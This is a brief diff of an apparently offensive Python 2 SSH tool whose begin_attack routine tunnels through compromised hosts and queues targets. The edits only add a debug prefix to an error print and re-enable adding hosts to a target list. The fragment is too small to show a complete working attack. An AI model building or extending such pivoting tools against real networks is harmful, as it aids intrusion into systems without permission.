@@ -182,7 +182,7 @@ def begin_attack(client):
                         forward_tunnel(compObj.local_forward, compObj.host, compObj.ssh_port, client.get_transport())
                         verbose('Now forwarding %s:%d to %s:%d ...' % ("localhost", compObj.local_forward, compObj.host, compObj.ssh_port))
                     except Exception as e:
-                        print e
+                        print "HERE: %s" % e
 
             # if we are logged in as root
             if log_root:
@@ -294,7 +294,7 @@ if __name__ == "__main__":
         host, port = get_host_port(c)
         compObj = Computer(host, port)
         compObj.initial = True
-        # ip_list.append(host)
+        ip_list.append(host)
         q.put(compObj)
 
     begin_attack(client)
